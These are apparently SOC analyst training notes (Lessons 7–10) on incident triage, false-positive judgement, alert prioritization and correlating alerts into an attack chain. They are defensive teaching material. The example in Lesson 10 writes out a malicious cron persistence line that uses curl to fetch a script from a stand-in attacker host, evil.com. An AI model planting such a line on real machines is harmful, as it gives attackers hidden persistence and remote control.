# Lessons 7–10 — SOC Incident Response Workflow

## Lesson 7 — Incident Response Workflow for SOC Analysts

### Core Flow
Alert → Validate → Scope → Timeline → Severity → Action → Report

### The Seven Steps
1. **Alert Receipt** — System fires an alert
2. **Validate** — Is this real or false positive?
3. **Scope** — How many systems/users affected?
4. **Timeline** — When did it start? When did it stop?
5. **Severity** — Critical, High, Medium, Low?
6. **Containment** — What do we do RIGHT NOW?
7. **Report** — Document for L2/L3

### Key Principle
Alert ≠ Attack

Validation must be evidence-based, not assumption.

### Example: Production Server Compromise
Validation: Multiple failed SSH + 1 success from TOR exit node = suspicious
Scope: Single host (web-api-prod-02), service account (svc_webapi)
Timeline: 14:07 → PowerShell execution, 14:08 → unknown payload
Severity: Critical (production + payload executed + C2 attempted)
Action: Isolate host, reset credentials, escalate to L2
Report: Production system compromised via service account. Payload executed. Isolation recommended pending L2 investigation.

---

## Lesson 8 — False Positive vs True Positive

### Definitions
- **True Positive (TP)** → Alert is correct, real malicious activity
- **False Positive (FP)** → Alert triggered but behavior is legitimate

### Decision Layers (4-Layer Model)

**Layer 1 — Source (WHO)**
- Internal IP or external?
- Known user or unknown?
- TOR/VPN/cloud exit node?

**Layer 2 — Behavior (WHAT)**
- Normal action or abnormal?
- Frequency and pattern?

**Layer 3 — Context (WHEN/WHY)**
- Time of activity matches user behavior?
- During business hours or off-hours?

**Layer 4 — Impact (SO WHAT)**
- Did anything actually happen?
- Success or attempt only?

### Classification States
- **Benign** → Clearly normal
- **Suspicious** → Needs more data
- **Malicious** → Confirmed attack

### Key Insight
Weird ≠ malicious

Always ask: "Can I explain this legitimately?"

### Example Scenarios

**Scenario A: 5 Failed SSH + Success (Internal IP)**
- Source: 192.168.1.25 (internal)
- Behavior: Failed 5x, then success
- Context: No odd timing
- Impact: No post-login activity
- **Decision: Likely FP (user forgot password)**

**Scenario B: TOR Login + Sudo + Cron**
- Source: 185.220.101.45 (TOR exit node)
- Behavior: Login → sudo → cron → outbound beacon
- Context: Off-hours (02:30)
- Impact: Persistence established + C2 communication
- **Decision: Malicious (confirmed attack)**

---

## Lesson 9 — Signal vs Noise (Prioritization)

### Core Formula
Priority = Impact + Stage + Activity Status

### Attack Stages (Priority Ranking)
1. **Recon** (Port scan, enumeration) → Low priority
2. **Initial Access** (Login, credential abuse) → Medium priority
3. **Execution** (Payload run, command execution) → High priority
4. **Persistence / C2** (Cron job, SSH key, beacon) → Critical priority

### Golden Rule
**Active threat > Most severe-looking-but-dormant threat**

If an alert happened yesterday but beaconing is active NOW, investigate what is happening RIGHT NOW first.

### Activity Status Matrix

| Status | Priority |
|--------|----------|
| Ongoing (active) | Highest |
| Completed | Medium |
| Old log | Low |

### Example: Alert Queue Prioritization

**Alert 1:** 5 Failed SSH logins from 192.168.1.10  
**Alert 2:** Successful login from Germany (new location, admin account)  
**Alert 3:** Sudo executed, /etc/shadow accessed  
**Alert 4:** Outbound connection every 5 min to 185.220.101.45  
**Alert 5:** Port scan from external IP  

**Correct Ranking:**
1. Alert 4 (C2 beaconing — persistence + active communication)
2. Alert 3 (Privilege escalation — credential theft)
3. Alert 2 (Suspicious login — active entry point)
4. Alert 5 (Reconnaissance — common, low impact)
5. Alert 1 (Failed logins — likely user error)

**Twist Case:** If Alert 2 was happening RIGHT NOW, it moves to Priority 1 because you can still stop the attacker at the entry point.

### Key Insight
Prioritize where you can interrupt the attacker FASTEST, not what is theoretically most dangerous.

---

## Lesson 10 — Multi-Alert Correlation (Attack Story)

### Core Concept
Multiple alerts = ONE attack chain

Your job: merge fragments into a unified incident narrative.

### Correlation Anchors (How to Link Alerts)

**Anchor 1 — Same User**
- Login → sudo → cron executed by same user = strong link

**Anchor 2 — Same IP**
- Brute force → login → outbound from same IP = attacker path

**Anchor 3 — Timeline (Contiguous Events)**
- 02:30 → login
- 02:32 → sudo
- 02:35 → cron job
- 02:40 → beacon
- Close timing = not coincidence

**Anchor 4 — Behavior Chain**
- Access → Escalation → Persistence → C2 = coherent attack progression

### Attack Chain Model
Initial Access → Privilege Escalation → Persistence → C2 Establishment

### Example: Full Incident Correlation

**Raw Alerts:**
- Alert A: 12 failed SSH from 185.220.101.45 (02:30)
- Alert B: Successful login 'ubuntu' from 185.220.101.45 (02:32)
- Alert C: sudo executed by 'ubuntu' (02:34)
- Alert D: Cron job added every 5 min (02:36)
- Alert E: Outbound to evil.com every 5 min (02:40)

**Correlated Incident:**

**Are these alerts connected:** Yes — same source IP, same user, contiguous timeline, coherent attack progression.

**Attack Chain:**
- 02:30 → 12 failed SSH attempts from 185.220.101.45
- 02:32 → Successful login for user 'ubuntu' from same IP
- 02:34 → sudo executed by 'ubuntu' (privilege escalation)
- 02:36 → Cron job created: `*/5 * * * * curl http://evil.com/beacon.sh`
- 02:40 → Repeating outbound connections to evil.com (5-min interval)

**Stage Mapping:**
- **Initial Access:** SSH brute force → successful login
- **Privilege Escalation:** sudo execution by compromised user
- **Persistence:** cron job establishing recurring execution
- **C2 (Command & Control):** periodic outbound beaconing to external domain

**Final Assessment:**
Confirmed host compromise of user 'ubuntu' via brute force from IP 185.220.101.45, followed by privilege escalation and establishment of persistence through scheduled cron job. Ongoing C2 beaconing indicates active attacker presence and control.

---

## Master Principles (Across Lessons 7–10)

1. **Don't trust alerts blindly** → Validate first
2. **Don't isolate alerts** → Correlate into stories
3. **Don't chase noise** → Prioritize by impact + activity
4. **Don't assume** → Prove with evidence
5. **Always think in attack stages** → Access → Escalate → Persist → C2

### One-Line Summary
"From alert → to story → to decision."

---

## Portfolio Integration Note
These lessons represent the transition from **detection** (Splunk rules #1-10) to **analysis** (incident triage and response workflow). The analyst internal monologue—the reasoning that separates beginners from professionals—is the core of Lessons 7–10.
